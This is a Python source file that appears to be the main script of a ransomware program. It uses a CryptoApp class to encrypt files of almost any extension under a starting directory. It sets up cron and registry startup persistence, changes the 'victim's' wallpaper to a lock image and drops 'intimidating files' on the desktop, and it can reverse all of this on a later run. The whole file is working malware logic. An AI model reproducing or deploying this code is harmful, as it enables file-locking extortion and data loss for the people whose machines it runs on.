from CryptoApp import CryptoApp
import os
import json
from operator import itemgetter
from sys import argv
from typing import Optional
import utils as fn



# Get the starting path
# Otherwise start from the current directory
try:
    START_PATH: str = argv[1] if os.path.isdir(argv[1]) else os.getcwd()
except IndexError:
    START_PATH: str = os.getcwd()


# Variables that must be initialized before CryptoApp constructor
JSON_PATH:         str = 'info.json'
extra_files_name:  str = 'Hello_lock'
desktop_path:      str = os.path.join(os.path.expanduser('~'), "Desktop")
lock_wallpaper:    str = os.path.abspath('locked.jpg')
initScript:        Optional[str] = os.path.abspath(os.path.join('run', 'linuxtest.py'))
new_wallpaper:     Optional[str] = None

# Init the APP
APP: CryptoApp = CryptoApp(START_PATH)

# Set the initial options
APP.setFilesToSkip([JSON_PATH, 'locked.jpg', 'utils.py', 'run', '.git', f'{extra_files_name}*.txt'])
APP.setExtensionsToModify([
    '.txt', '.docx', '.odt',
    '.jpg', '.png', '.jpeg', '.gif',
    '.mp3', '.mp4', '.avi', 
    '.json', '.conf',
    '.py', '.js', '.html',
    '.*'
])

# Init the variables
target_os, target_de = APP.determineOS()


if __name__ == '__main__':
    # Start decrypting
    if APP.isAlreadyEncrypted():
        APP.decrypt()

        # Stop the script that was launched during encryption, depending on the OS
        APP.cronStartupAction(target_os, 'stop', initScript)
        APP.registryStartupAction(target_os, 'stop', initScript)

        # Remove every extra file that was created during encryption (on desktop)
        fn.removeGlobFiles(desktop_path, extra_files_name)

        # If decrypted successfully, handle the JSON file
        # And set the old wallpaper if possible
        new_wallpaper: Optional[str] = fn.handleAndRemoveJSONinfo(JSON_PATH, APP)


    # Start encrypting
    else:
        APP.encrypt()

        # Launch a script on startup, depending on the OS
        APP.cronStartupAction(target_os, 'start', initScript)
        APP.registryStartupAction(target_os, 'start', initScript)

        # Get the total number of modified files and directories
        files_num, dirs_num = APP.getCount()

        # Save some informations to a JSON file
        asJSON: dict = fn.saveInfoToJSON(target_os, target_de, dirs_num, files_num)

        # Get the current wallpaper
        # And save it to JSON
        currentBG: Optional[str] = APP.getDesktopBG(target_os, target_de)
        
        if currentBG:
            asJSON["original_background"] = currentBG
        
        # Locked screen wallpaper
        if os.path.isfile(lock_wallpaper):
            new_wallpaper = lock_wallpaper

        # Create and save the JSON
        j: str = json.dumps(asJSON, indent=4)
        APP.writeFile(JSON_PATH, j)

        # Create on Desktop some intimidating files
        fn.createGlobFiles(APP, desktop_path, extra_files_name)


    # Change the victim's wallpaper
    APP.setDesktopBG(target_os, target_de, new_wallpaper)
